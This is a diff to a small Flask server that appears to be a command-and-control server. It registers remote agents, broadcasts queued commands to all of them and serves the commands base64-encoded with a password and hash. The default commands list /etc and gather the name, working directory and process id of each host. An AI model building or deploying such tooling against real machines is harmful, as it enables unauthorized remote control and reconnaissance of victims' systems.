@@ -24,6 +24,9 @@ def register_agent(uname, uid):
 	}
 	if uid not in agent_db:
 		agent_db[uid] = base
+		global cmds
+		for cmd in cmds:
+			add_all(cmd)
 	else:
 		print("Agent already registered")
 
@@ -40,11 +43,11 @@ def register():
 def serve_commands(pid):
 	global agent_db
 	print(agent_db)
-	commands = agent_db[pid]["poll"]
+	commands = agent_db[pid]["poll"] + "\n"
 	password = agent_db[pid]["password"]
 	for cmd in agent_db[pid]["commands"].keys():
-		hashed = hashlib.sha256(cmd.encode("utf-8")).hexdigest()
-		commands += f"{password}:{cmd}:{hashed}\n"
+		hashed = hashlib.sha256(f"{password}::{cmd}".encode("utf-8")).hexdigest()
+		commands += f"{password}::{cmd}::{hashed}\n"
 	return base64.urlsafe_b64encode(bytes(commands.encode('utf-8')))
 
 
@@ -55,16 +58,21 @@ def receive_data():
 	return "", 200
 
 
-def add_commands(command, uid):
+def add_command(command, uid):
 	global agent_db
 
 	agent_db[uid]["commands"][command] = "!EMPTY!"
 
+def add_all(command):
+	global agent_db
+	for uid in agent_db.keys():
+		add_command(command, uid)
+
 
 if __name__ == "__main__":
-	cmds.append("ls:/etc")
-	cmds.append("BUILTIN:name")
-	cmds.append("BUILTIN:cwd")
-	cmds.append("BUILTIN:pid")
+	cmds.append("ls::/etc")
+	cmds.append("BUILTIN::name")
+	cmds.append("BUILTIN::cwd")
+	cmds.append("BUILTIN::pid")
 
 	app.run(host="localhost", port=PORT, debug=True)
